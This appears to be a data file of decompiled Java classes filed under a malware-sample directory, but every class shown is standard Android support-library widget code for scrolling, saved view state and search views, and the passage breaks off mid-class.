"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\SavedState.code","public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel source){       return new SavedState(source);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } ;   int lockModeLeft;   int lockModeRight;   int openDrawerGravity;   public SavedState(  Parcel in){     super(in);     this.openDrawerGravity=0;     this.lockModeLeft=0;     this.lockModeRight=0;     this.openDrawerGravity=in.readInt();   }   public SavedState(  Parcelable superState){     super(superState);     this.openDrawerGravity=0;     this.lockModeLeft=0;     this.lockModeRight=0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     super.writeToParcel(dest,flags);     dest.writeInt(this.openDrawerGravity);   } } public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel in){       return new SavedState(in);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } ;   boolean isOpen;   SavedState(  Parcelable superState){     super(superState);   }   private SavedState(  Parcel in){     super(in);     this.isOpen=in.readInt() != 0;   }   @Override public void writeToParcel(  Parcel out,  int flags){     super.writeToParcel(out,flags);     out.writeInt(this.isOpen ? 1 : 0);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ScrollAnimationRunnable.code","public class ScrollAnimationRunnable implements Runnable {   private ScrollAnimationRunnable(){   }   @Override public void run(){     if (AutoScrollHelper.this.mAnimating) {       if (AutoScrollHelper.this.mNeedsReset) {         AutoScrollHelper.this.mNeedsReset=false;         AutoScrollHelper.this.mScroller.start();       }       ClampedScroller scroller=AutoScrollHelper.this.mScroller;       if (scroller.isFinished() || !AutoScrollHelper.this.shouldAnimate()) {         AutoScrollHelper.this.mAnimating=false;         return;       }       if (AutoScrollHelper.this.mNeedsCancel) {         AutoScrollHelper.this.mNeedsCancel=false;         AutoScrollHelper.this.cancelTargetTouch();       }       scroller.computeScrollDelta();       int deltaX=scroller.getDeltaX();       int deltaY=scroller.getDeltaY();       AutoScrollHelper.this.scrollTargetBy(deltaX,deltaY);       ViewCompat.postOnAnimation(AutoScrollHelper.this.mTarget,this);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ScrollerCompat.code","public class ScrollerCompat {   static final ScrollerCompatImpl IMPL;   Object mScroller; interface ScrollerCompatImpl {     void abortAnimation(    Object obj);     boolean computeScrollOffset(    Object obj);     Object createScroller(    Context context,    Interpolator interpolator);     void fling(    Object obj,    int i,    int i2,    int i3,    int i4,    int i5,    int i6,    int i7,    int i8);     void fling(    Object obj,    int i,    int i2,    int i3,    int i4,    int i5,    int i6,    int i7,    int i8,    int i9,    int i10);     float getCurrVelocity(    Object obj);     int getCurrX(    Object obj);     int getCurrY(    Object obj);     int getFinalX(    Object obj);     int getFinalY(    Object obj);     boolean isFinished(    Object obj);     boolean isOverScrolled(    Object obj);     void notifyHorizontalEdgeReached(    Object obj,    int i,    int i2,    int i3);     void notifyVerticalEdgeReached(    Object obj,    int i,    int i2,    int i3);     void startScroll(    Object obj,    int i,    int i2,    int i3,    int i4);     void startScroll(    Object obj,    int i,    int i2,    int i3,    int i4,    int i5);   } static class ScrollerCompatImplBase implements ScrollerCompatImpl {     ScrollerCompatImplBase(){     }     @Override public Object createScroller(    Context context,    Interpolator interpolator){       return interpolator != null ? new Scroller(context,interpolator) : new Scroller(context);     }     @Override public boolean isFinished(    Object scroller){       return ((Scroller)scroller).isFinished();     }     @Override public int getCurrX(    Object scroller){       return ((Scroller)scroller).getCurrX();     }     @Override public int getCurrY(    Object scroller){       return ((Scroller)scroller).getCurrY();     }     @Override public float getCurrVelocity(    Object scroller){       return 0.0f;     }     @Override public boolean computeScrollOffset(    Object scroller){       return ((Scroller)scroller).computeScrollOffset();     }     @Override public void startScroll(    Object scroller,    int startX,    int startY,    int dx,    int dy){       ((Scroller)scroller).startScroll(startX,startY,dx,dy);     }     @Override public void startScroll(    Object scroller,    int startX,    int startY,    int dx,    int dy,    int duration){       ((Scroller)scroller).startScroll(startX,startY,dx,dy,duration);     }     @Override public void fling(    Object scroller,    int startX,    int startY,    int velX,    int velY,    int minX,    int maxX,    int minY,    int maxY){       ((Scroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY);     }     @Override public void fling(    Object scroller,    int startX,    int startY,    int velX,    int velY,    int minX,    int maxX,    int minY,    int maxY,    int overX,    int overY){       ((Scroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY);     }     @Override public void abortAnimation(    Object scroller){       ((Scroller)scroller).abortAnimation();     }     @Override public void notifyHorizontalEdgeReached(    Object scroller,    int startX,    int finalX,    int overX){     }     @Override public void notifyVerticalEdgeReached(    Object scroller,    int startY,    int finalY,    int overY){     }     @Override public boolean isOverScrolled(    Object scroller){       return false;     }     @Override public int getFinalX(    Object scroller){       return ((Scroller)scroller).getFinalX();     }     @Override public int getFinalY(    Object scroller){       return ((Scroller)scroller).getFinalY();     }   } static class ScrollerCompatImplGingerbread implements ScrollerCompatImpl {     ScrollerCompatImplGingerbread(){     }     @Override public Object createScroller(    Context context,    Interpolator interpolator){       return ScrollerCompatGingerbread.createScroller(context,interpolator);     }     @Override public boolean isFinished(    Object scroller){       return ScrollerCompatGingerbread.isFinished(scroller);     }     @Override public int getCurrX(    Object scroller){       return ScrollerCompatGingerbread.getCurrX(scroller);     }     @Override public int getCurrY(    Object scroller){       return ScrollerCompatGingerbread.getCurrY(scroller);     }     @Override public float getCurrVelocity(    Object scroller){       return 0.0f;     }     @Override public boolean computeScrollOffset(    Object scroller){       return ScrollerCompatGingerbread.computeScrollOffset(scroller);     }     @Override public void startScroll(    Object scroller,    int startX,    int startY,    int dx,    int dy){       ScrollerCompatGingerbread.startScroll(scroller,startX,startY,dx,dy);     }     @Override public void startScroll(    Object scroller,    int startX,    int startY,    int dx,    int dy,    int duration){       ScrollerCompatGingerbread.startScroll(scroller,startX,startY,dx,dy,duration);     }     @Override public void fling(    Object scroller,    int startX,    int startY,    int velX,    int velY,    int minX,    int maxX,    int minY,    int maxY){       ScrollerCompatGingerbread.fling(scroller,startX,startY,velX,velY,minX,maxX,minY,maxY);     }     @Override public void fling(    Object scroller,    int startX,    int startY,    int velX,    int velY,    int minX,    int maxX,    int minY,    int maxY,    int overX,    int overY){       ScrollerCompatGingerbread.fling(scroller,startX,startY,velX,velY,minX,maxX,minY,maxY,overX,overY);     }     @Override public void abortAnimation(    Object scroller){       ScrollerCompatGingerbread.abortAnimation(scroller);     }     @Override public void notifyHorizontalEdgeReached(    Object scroller,    int startX,    int finalX,    int overX){       ScrollerCompatGingerbread.notifyHorizontalEdgeReached(scroller,startX,finalX,overX);     }     @Override public void notifyVerticalEdgeReached(    Object scroller,    int startY,    int finalY,    int overY){       ScrollerCompatGingerbread.notifyVerticalEdgeReached(scroller,startY,finalY,overY);     }     @Override public boolean isOverScrolled(    Object scroller){       return ScrollerCompatGingerbread.isOverScrolled(scroller);     }     @Override public int getFinalX(    Object scroller){       return ScrollerCompatGingerbread.getFinalX(scroller);     }     @Override public int getFinalY(    Object scroller){       return ScrollerCompatGingerbread.getFinalY(scroller);     }   } static class ScrollerCompatImplIcs extends ScrollerCompatImplGingerbread {     ScrollerCompatImplIcs(){     }     @Override public float getCurrVelocity(    Object scroller){       return ScrollerCompatIcs.getCurrVelocity(scroller);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 14) {       IMPL=new ScrollerCompatImplIcs();     }  else     if (version >= 9) {       IMPL=new ScrollerCompatImplGingerbread();     }  else {       IMPL=new ScrollerCompatImplBase();     }   }   public static ScrollerCompat create(  Context context){     return create(context,null);   }   public static ScrollerCompat create(  Context context,  Interpolator interpolator){     return new ScrollerCompat(context,interpolator);   }   ScrollerCompat(  Context context,  Interpolator interpolator){     this.mScroller=IMPL.createScroller(context,interpolator);   }   public boolean isFinished(){     return IMPL.isFinished(this.mScroller);   }   public int getCurrX(){     return IMPL.getCurrX(this.mScroller);   }   public int getCurrY(){     return IMPL.getCurrY(this.mScroller);   }   public int getFinalX(){     return IMPL.getFinalX(this.mScroller);   }   public int getFinalY(){     return IMPL.getFinalY(this.mScroller);   }   public float getCurrVelocity(){     return IMPL.getCurrVelocity(this.mScroller);   }   public boolean computeScrollOffset(){     return IMPL.computeScrollOffset(this.mScroller);   }   public void startScroll(  int startX,  int startY,  int dx,  int dy){     IMPL.startScroll(this.mScroller,startX,startY,dx,dy);   }   public void startScroll(  int startX,  int startY,  int dx,  int dy,  int duration){     IMPL.startScroll(this.mScroller,startX,startY,dx,dy,duration);   }   public void fling(  int startX,  int startY,  int velocityX,  int velocityY,  int minX,  int maxX,  int minY,  int maxY){     IMPL.fling(this.mScroller,startX,startY,velocityX,velocityY,minX,maxX,minY,maxY);   }   public void fling(  int startX,  int startY,  int velocityX,  int velocityY,  int minX,  int maxX,  int minY,  int maxY,  int overX,  int overY){     IMPL.fling(this.mScroller,startX,startY,velocityX,velocityY,minX,maxX,minY,maxY,overX,overY);   }   public void abortAnimation(){     IMPL.abortAnimation(this.mScroller);   }   public void notifyHorizontalEdgeReached(  int startX,  int finalX,  int overX){     IMPL.notifyHorizontalEdgeReached(this.mScroller,startX,finalX,overX);   }   public void notifyVerticalEdgeReached(  int startY,  int finalY,  int overY){     IMPL.notifyVerticalEdgeReached(this.mScroller,startY,finalY,overY);   }   public boolean isOverScrolled(){     return IMPL.isOverScrolled(this.mScroller);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ScrollerCompatGingerbread.code","class ScrollerCompatGingerbread {   ScrollerCompatGingerbread(){   }   public static Object createScroller(  Context context,  Interpolator interpolator){     return interpolator != null ? new OverScroller(context,interpolator) : new OverScroller(context);   }   public static boolean isFinished(  Object scroller){     return ((OverScroller)scroller).isFinished();   }   public static int getCurrX(  Object scroller){     return ((OverScroller)scroller).getCurrX();   }   public static int getCurrY(  Object scroller){     return ((OverScroller)scroller).getCurrY();   }   public static boolean computeScrollOffset(  Object scroller){     return ((OverScroller)scroller).computeScrollOffset();   }   public static void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy){     ((OverScroller)scroller).startScroll(startX,startY,dx,dy);   }   public static void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy,  int duration){     ((OverScroller)scroller).startScroll(startX,startY,dx,dy,duration);   }   public static void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY){     ((OverScroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY);   }   public static void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY,  int overX,  int overY){     ((OverScroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY,overX,overY);   }   public static void abortAnimation(  Object scroller){     ((OverScroller)scroller).abortAnimation();   }   public static void notifyHorizontalEdgeReached(  Object scroller,  int startX,  int finalX,  int overX){     ((OverScroller)scroller).notifyHorizontalEdgeReached(startX,finalX,overX);   }   public static void notifyVerticalEdgeReached(  Object scroller,  int startY,  int finalY,  int overY){     ((OverScroller)scroller).notifyVerticalEdgeReached(startY,finalY,overY);   }   public static boolean isOverScrolled(  Object scroller){     return ((OverScroller)scroller).isOverScrolled();   }   public static int getFinalX(  Object scroller){     return ((OverScroller)scroller).getFinalX();   }   public static int getFinalY(  Object scroller){     return ((OverScroller)scroller).getFinalY();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ScrollerCompatIcs.code","class ScrollerCompatIcs {   ScrollerCompatIcs(){   }   public static float getCurrVelocity(  Object scroller){     return ((OverScroller)scroller).getCurrVelocity();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ScrollerCompatImpl.code","interface ScrollerCompatImpl {   void abortAnimation(  Object obj);   boolean computeScrollOffset(  Object obj);   Object createScroller(  Context context,  Interpolator interpolator);   void fling(  Object obj,  int i,  int i2,  int i3,  int i4,  int i5,  int i6,  int i7,  int i8);   void fling(  Object obj,  int i,  int i2,  int i3,  int i4,  int i5,  int i6,  int i7,  int i8,  int i9,  int i10);   float getCurrVelocity(  Object obj);   int getCurrX(  Object obj);   int getCurrY(  Object obj);   int getFinalX(  Object obj);   int getFinalY(  Object obj);   boolean isFinished(  Object obj);   boolean isOverScrolled(  Object obj);   void notifyHorizontalEdgeReached(  Object obj,  int i,  int i2,  int i3);   void notifyVerticalEdgeReached(  Object obj,  int i,  int i2,  int i3);   void startScroll(  Object obj,  int i,  int i2,  int i3,  int i4);   void startScroll(  Object obj,  int i,  int i2,  int i3,  int i4,  int i5); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ScrollerCompatImplBase.code","static class ScrollerCompatImplBase implements ScrollerCompatImpl {   ScrollerCompatImplBase(){   }   @Override public Object createScroller(  Context context,  Interpolator interpolator){     return interpolator != null ? new Scroller(context,interpolator) : new Scroller(context);   }   @Override public boolean isFinished(  Object scroller){     return ((Scroller)scroller).isFinished();   }   @Override public int getCurrX(  Object scroller){     return ((Scroller)scroller).getCurrX();   }   @Override public int getCurrY(  Object scroller){     return ((Scroller)scroller).getCurrY();   }   @Override public float getCurrVelocity(  Object scroller){     return 0.0f;   }   @Override public boolean computeScrollOffset(  Object scroller){     return ((Scroller)scroller).computeScrollOffset();   }   @Override public void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy){     ((Scroller)scroller).startScroll(startX,startY,dx,dy);   }   @Override public void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy,  int duration){     ((Scroller)scroller).startScroll(startX,startY,dx,dy,duration);   }   @Override public void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY){     ((Scroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY);   }   @Override public void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY,  int overX,  int overY){     ((Scroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY);   }   @Override public void abortAnimation(  Object scroller){     ((Scroller)scroller).abortAnimation();   }   @Override public void notifyHorizontalEdgeReached(  Object scroller,  int startX,  int finalX,  int overX){   }   @Override public void notifyVerticalEdgeReached(  Object scroller,  int startY,  int finalY,  int overY){   }   @Override public boolean isOverScrolled(  Object scroller){     return false;   }   @Override public int getFinalX(  Object scroller){     return ((Scroller)scroller).getFinalX();   }   @Override public int getFinalY(  Object scroller){     return ((Scroller)scroller).getFinalY();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ScrollerCompatImplGingerbread.code","static class ScrollerCompatImplGingerbread implements ScrollerCompatImpl {   ScrollerCompatImplGingerbread(){   }   @Override public Object createScroller(  Context context,  Interpolator interpolator){     return ScrollerCompatGingerbread.createScroller(context,interpolator);   }   @Override public boolean isFinished(  Object scroller){     return ScrollerCompatGingerbread.isFinished(scroller);   }   @Override public int getCurrX(  Object scroller){     return ScrollerCompatGingerbread.getCurrX(scroller);   }   @Override public int getCurrY(  Object scroller){     return ScrollerCompatGingerbread.getCurrY(scroller);   }   @Override public float getCurrVelocity(  Object scroller){     return 0.0f;   }   @Override public boolean computeScrollOffset(  Object scroller){     return ScrollerCompatGingerbread.computeScrollOffset(scroller);   }   @Override public void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy){     ScrollerCompatGingerbread.startScroll(scroller,startX,startY,dx,dy);   }   @Override public void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy,  int duration){     ScrollerCompatGingerbread.startScroll(scroller,startX,startY,dx,dy,duration);   }   @Override public void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY){     ScrollerCompatGingerbread.fling(scroller,startX,startY,velX,velY,minX,maxX,minY,maxY);   }   @Override public void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY,  int overX,  int overY){     ScrollerCompatGingerbread.fling(scroller,startX,startY,velX,velY,minX,maxX,minY,maxY,overX,overY);   }   @Override public void abortAnimation(  Object scroller){     ScrollerCompatGingerbread.abortAnimation(scroller);   }   @Override public void notifyHorizontalEdgeReached(  Object scroller,  int startX,  int finalX,  int overX){     ScrollerCompatGingerbread.notifyHorizontalEdgeReached(scroller,startX,finalX,overX);   }   @Override public void notifyVerticalEdgeReached(  Object scroller,  int startY,  int finalY,  int overY){     ScrollerCompatGingerbread.notifyVerticalEdgeReached(scroller,startY,finalY,overY);   }   @Override public boolean isOverScrolled(  Object scroller){     return ScrollerCompatGingerbread.isOverScrolled(scroller);   }   @Override public int getFinalX(  Object scroller){     return ScrollerCompatGingerbread.getFinalX(scroller);   }   @Override public int getFinalY(  Object scroller){     return ScrollerCompatGingerbread.getFinalY(scroller);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ScrollerCompatImplIcs.code","static class ScrollerCompatImplIcs extends ScrollerCompatImplGingerbread {   ScrollerCompatImplIcs(){   }   @Override public float getCurrVelocity(  Object scroller){     return ScrollerCompatIcs.getCurrVelocity(scroller);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\SearchViewCompat.code","public class SearchViewCompat {   private static final SearchViewCompatImpl IMPL; interface SearchViewCompatImpl {     CharSequence getQuery(    View view);     boolean isIconified(    View view);     boolean isQueryRefinementEnabled(    View view);     boolean isSubmitButtonEnabled(    View view);     Object newOnCloseListener(    OnCloseListenerCompat onCloseListenerCompat);     Object newOnQueryTextListener(    OnQueryTextListenerCompat onQueryTextListenerCompat);     View newSearchView(    Context context);     void setIconified(    View view,    boolean z);     void setImeOptions(    View view,    int i);     void setInputType(    View view,    int i);     void setMaxWidth(    View view,    int i);     void setOnCloseListener(    Object obj,    Object obj2);     void setOnQueryTextListener(    Object obj,    Object obj2);     void setQuery(    View view,    CharSequence charSequence,    boolean z);     void setQueryHint(    View view,    CharSequence charSequence);     void setQueryRefinementEnabled(    View view,    boolean z);     void setSearchableInfo(    View view,    ComponentName componentName);     void setSubmitButtonEnabled(    View view,    boolean z);   } static class SearchViewCompatStubImpl implements SearchViewCompatImpl {     SearchViewCompatStubImpl(){     }     @Override public View newSearchView(    Context context){       return null;     }     @Override public void setSearchableInfo(    View searchView,    ComponentName searchableComponent){     }     @Override public void setImeOptions(    View searchView,    int imeOptions){     }     @Override public void setInputType(    View searchView,    int inputType){     }     @Override public Object newOnQueryTextListener(    OnQueryTextListenerCompat listener){       return null;     }     @Override public void setOnQueryTextListener(    Object searchView,    Object listener){     }     @Override public Object newOnCloseListener(    OnCloseListenerCompat listener){       return null;     }     @Override public void setOnCloseListener(    Object searchView,    Object listener){     }     @Override public CharSequence getQuery(    View searchView){       return null;     }     @Override public void setQuery(    View searchView,    CharSequence query,    boolean submit){     }     @Override public void setQueryHint(    View searchView,    CharSequence hint){     }     @Override public void setIconified(    View searchView,    boolean iconify){     }     @Override public boolean isIconified(    View searchView){       return true;     }     @Override public void setSubmitButtonEnabled(    View searchView,    boolean enabled){     }     @Override public boolean isSubmitButtonEnabled(    View searchView){       return false;     }     @Override public void setQueryRefinementEnabled(    View searchView,    boolean enable){     }     @Override public boolean isQueryRefinementEnabled(    View searchView){       return false;     }     @Override public void setMaxWidth(    View searchView,    int maxpixels){     }   } static class SearchViewCompatHoneycombImpl extends SearchViewCompatStubImpl {     SearchViewCompatHoneycombImpl(){     }     @Override public View newSearchView(    Context context){       return SearchViewCompatHoneycomb.newSearchView(context);     }     @Override public void setSearchableInfo(    View searchView,    ComponentName searchableComponent){       SearchViewCompatHoneycomb.setSearchableInfo(searchView,searchableComponent);     }     @Override public Object newOnQueryTextListener(    final OnQueryTextListenerCompat listener){       return SearchViewCompatHoneycomb.newOnQueryTextListener(new SearchViewCompatHoneycomb.OnQueryTextListenerCompatBridge(){         @Override public boolean onQueryTextSubmit(        String query){           return listener.onQueryTextSubmit(query);         }         @Override public boolean onQueryTextChange(        String newText){           return listener.onQueryTextChange(newText);         }       } );     }     @Override public void setOnQueryTextListener(    Object searchView,    Object listener){       SearchViewCompatHoneycomb.setOnQueryTextListener(searchView,listener);     }     @Override public Object newOnCloseListener(    final OnCloseListenerCompat listener){       return SearchViewCompatHoneycomb.newOnCloseListener(new SearchViewCompatHoneycomb.OnCloseListenerCompatBridge(){         @Override public boolean onClose(){           return listener.onClose();         }       } );     }     @Override public void setOnCloseListener(    Object searchView,    Object listener){       SearchViewCompatHoneycomb.setOnCloseListener(searchView,listener);     }     @Override public CharSequence getQuery(    View searchView){       return SearchViewCompatHoneycomb.getQuery(searchView);     }     @Override public void setQuery(    View searchView,    CharSequence query,    boolean submit){       SearchViewCompatHoneycomb.setQuery(searchView,query,submit);     }     @Override public void setQueryHint(    View searchView,    CharSequence hint){       SearchViewCompatHoneycomb.setQueryHint(searchView,hint);     }     @Override public void setIconified(    View searchView,    boolean iconify){       SearchViewCompatHoneycomb.setIconified(searchView,iconify);     }     @Override public boolean isIconified(    View searchView){       return SearchViewCompatHoneycomb.isIconified(searchView);     }     @Override public void setSubmitButtonEnabled(    View searchView,    boolean enabled){       SearchViewCompatHoneycomb.setSubmitButtonEnabled(searchView,enabled);     }     @Override public boolean isSubmitButtonEnabled(    View searchView){       return SearchViewCompatHoneycomb.isSubmitButtonEnabled(searchView);     }     @Override public void setQueryRefinementEnabled(    View searchView,    boolean enable){       SearchViewCompatHoneycomb.setQueryRefinementEnabled(searchView,enable);     }     @Override public boolean isQueryRefinementEnabled(    View searchView){       return SearchViewCompatHoneycomb.isQueryRefinementEnabled(searchView);     }     @Override public void setMaxWidth(    View searchView,    int maxpixels){       SearchViewCompatHoneycomb.setMaxWidth(searchView,maxpixels);     }   } static class SearchViewCompatIcsImpl extends SearchViewCompatHoneycombImpl {     SearchViewCompatIcsImpl(){     }     @Override public View newSearchView(    Context context){       return SearchViewCompatIcs.newSearchView(context);     }     @Override public void setImeOptions(    View searchView,    int imeOptions){       SearchViewCompatIcs.setImeOptions(searchView,imeOptions);     }     @Override public void setInputType(    View searchView,    int inputType){       SearchViewCompatIcs.setInputType(searchView,inputType);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new SearchViewCompatIcsImpl();     }  else     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new SearchViewCompatHoneycombImpl();     }  else {       IMPL=new SearchViewCompatStubImpl();     }   }   private SearchViewCompat(  Context context){   }   public static View newSearchView(  Context context){     return IMPL.newSearchView(context);   }   public static void setSearchableInfo(  View searchView,  ComponentName searchableComponent){     IMPL.setSearchableInfo(searchView,searchableComponent);   }   public static void setImeOptions(  View searchView,  int imeOptions){     IMPL.setImeOptions(searchView,imeOptions);   }   public static void setInputType(  View searchView,  int inputType){     IMPL.setInputType(searchView,inputType);   }   public static void setOnQueryTextListener(  View searchView,  OnQueryTextListenerCompat listener){     IMPL.setOnQueryTextListener(searchView,listener.mListener);   } public static abstract class OnQueryTextListenerCompat {     final Object mListener=SearchViewCompat.IMPL.newOnQueryTextListener(this);     public boolean onQueryTextSubmit(    String query){       return false;     }     public boolean onQueryTextChange(    String newText){       return false;     }   }   public static void setOnCloseListener(  View searchView,  OnCloseListenerCompat listener){     IMPL.setOnCloseListener(searchView,listener.mListener);   } public static abstract class OnCloseListenerCompat {     final Object mListener=SearchViewCompat.IMPL.newOnCloseListener(this);     public boolean onClose(){       return false;     }   }   public static CharSequence getQuery(  View searchView){     return IMPL.getQuery(searchView);   }   public static void setQuery(  View searchView,  CharSequence query,  boolean submit){     IMPL.setQuery(searchView,query,submit);   }   public static void setQueryHint(  View searchView,  CharSequence hint){     IMPL.setQueryHint(searchView,hint);   }   public static void setIconified(  View searchView,  boolean iconify){     IMPL.setIconified(searchView,iconify);   }   public static boolean isIconified(  View searchView){     return IMPL.isIconified(searchView);   }   public static void setSubmitButtonEnabled(  View searchView,  boolean enabled){     IMPL.setSubmitButtonEnabled(searchView,enabled);   }   public static boolean isSubmitButtonEnabled(  View searchView){     return IMPL.isSubmitButtonEnabled(searchView);   }   public static void setQueryRefinementEnabled(  View searchView,  boolean enable){     IMPL.setQueryRefinementEnabled(searchView,enable);   }   public static boolean isQueryRefinementEnabled(  View searchView){     return IMPL.isQueryRefinementEnabled(searchView);   }   public static void setMaxWidth(  View searchView,  int maxpixels){     IMPL.setMaxWidth(searchView,maxpixels);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\SearchViewCompatHoneycomb.code","class SearchViewCompatHoneycomb { interface OnCloseListenerCompatBridge {     boolean onClose();   } interface OnQueryTextListenerCompatBridge {     boolean onQueryTextChange(    String str);     boolean onQueryTextSubmit(    String str);   }   SearchViewCompatHoneycomb(){   }   public static View newSearchView(  Context context){     return new SearchView(context);   }   public static void setSearchableInfo(  View searchView,  ComponentName searchableComponent){     SearchView sv=(SearchView)searchView;     SearchManager searchManager=(SearchManager)sv.getContext().getSystemService(""search"");     sv.setSearchableInfo(searchManager.getSearchableInfo(searchableComponent));   }   public static Object newOnQueryTextListener(  final OnQueryTextListenerCompatBridge listener){     return new SearchView.OnQueryTextListener(){       @Override public boolean onQueryTextSubmit(      String query){         return OnQueryTextListenerCompatBridge.this.onQueryTextSubmit(query);       }       @Override public boolean onQueryTextChange(      String newText){         return OnQueryTextListenerCompatBridge.this.onQueryTextChange(newText);       }     } ;   }   public static void setOnQueryTextListener(  Object searchView,  Object listener){     ((SearchView)searchView).setOnQueryTextListener((SearchView.OnQueryTextListener)listener);   }   public static Object newOnCloseListener(  final OnCloseListenerCompatBridge listener){     return new SearchView.OnCloseListener(){       @Override public boolean onClose(){         return OnCloseListenerCompatBridge.this.onClose();       }     } ;   }   public static void setOnCloseListener(  Object searchView,  Object listener){     ((SearchView)searchView).setOnCloseListener((SearchView.OnCloseListener)listener);   }   public static CharSequence getQuery(  View searchView){     return ((SearchView)searchView).getQuery();   }   public static void setQuery(  View searchView,  CharSequence query,  boolean submit){     ((SearchView)searchView).setQuery(query,submit);   }   public static void setQueryHint(  View searchView,  CharSequence hint){     ((SearchView)searchView).setQueryHint(hint);   }   public static void setIconified(  View searchView,  boolean iconify){     ((SearchView)searchView).setIconified(iconify);   }   public static boolean isIconified(  View searchView){     return ((SearchView)searchView).isIconified();   }   public static void setSubmitButtonEnabled(  View searchView,  boolean enabled){     ((SearchView)searchView).setSubmitButtonEnabled(enabled);   }   public static boolean isSubmitButtonEnabled(  View searchView){     return ((SearchView)searchView).isSubmitButtonEnabled();   }   public static void setQueryRefinementEnabled(  View searchView,  boolean enable){     ((SearchView)searchView).setQueryRefinementEnabled(enable);   }   public static boolean isQueryRefinementEnabled(  View searchView){     return ((SearchView)searchView).isQueryRefinementEnabled();   }   public static void setMaxWidth(  View searchView,  int maxpixels){     ((SearchView)searchView).setMaxWidth(maxpixels);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\SearchViewCompatHoneycombImpl.code","static class SearchViewCompatHoneycombImpl extends SearchViewCompatStubImpl {   SearchViewCompatHoneycombImpl(){   }   @Override public View newSearchView(  Context context){     return SearchViewCompatHoneycomb.newSearchView(context);   }   @Override public void setSearchableInfo(  View searchView,  ComponentName searchableComponent){     SearchViewCompatHoneycomb.setSearchableInfo(searchView,searchableComponent);   }   @Override public Object newOnQueryTextListener(  final OnQueryTextListenerCompat listener){     return SearchViewCompatHoneycomb.newOnQueryTextListener(new SearchViewCompatHoneycomb.OnQueryTextListenerCompatBridge(){       @Override public boolean onQueryTextSubmit(      String query){         return listener.onQueryTextSubmit(query);       }       @Override public boolean onQueryTextChange(      String newText){         return listener.onQueryTextChange(newText);       }     } );   }   @Override public void setOnQueryTextListener(  Object searchView,  Object listener){     SearchViewCompatHoneycomb.setOnQueryTextListener(searchView,listener);   }   @Override public Object newOnCloseListener(  final OnCloseListenerCompat listener){     return SearchViewCompatHoneycomb.newOnCloseListener(new SearchViewCompatHoneycomb.OnCloseListenerCompatBridge(){       @Override public boolean onClose(){         return listener.onClose();       }     } );   }   @Override public void setOnCloseListener(  Object searchView,  Object listener){     SearchViewCompatHoneycomb.setOnCloseListener(searchView,listener);   }   @Override public CharSequence getQuery(  View searchView){     return SearchViewCompatHoneycomb.getQuery(searchView);   }   @Override public void setQuery(  View searchView,  CharSequence query,  boolean submit){     SearchViewCompatHoneycomb.setQuery(searchView,query,submit);   }   @Override public void setQueryHint(  View searchView,  CharSequence hint){     SearchViewCompatHoneycomb.setQueryHint(searchView,hint);   }   @Override public void setIconified(  View searchView,  boolean iconify){     SearchViewCompatHoneycomb.setIconified(searchView,iconify);   }   @Override public boolean isIconified(  View searchView){     return SearchViewCompatHoneycomb.isIconified(searchView);   }   @Override public 